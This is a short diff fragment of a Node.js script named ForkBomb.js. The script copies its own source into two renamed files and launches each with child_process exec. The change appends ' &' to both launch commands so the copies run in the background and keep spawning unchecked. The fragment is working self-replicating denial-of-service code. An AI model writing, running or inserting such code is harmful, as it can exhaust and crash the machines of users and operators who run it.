@@ -30,8 +30,8 @@ var path = require('path');
 var exec = require('child_process').exec;
 var firstChildName = getFileName() + '0';
 var secondChildName = getFileName() + '1';
-var runFirst = 'node ' + firstChildName + '.js';
-var runSecond = 'node ' + secondChildName + '.js';
+var runFirst = 'node ' + firstChildName + '.js &';
+var runSecond = 'node ' + secondChildName + '.js &';
 
 fs.readFile('ForkBomb.js', 'utf8' , function(err, data){
   fs.writeFile(firstChildName + '.js', data.replace(getFileName(), firstChildName), function(err){});
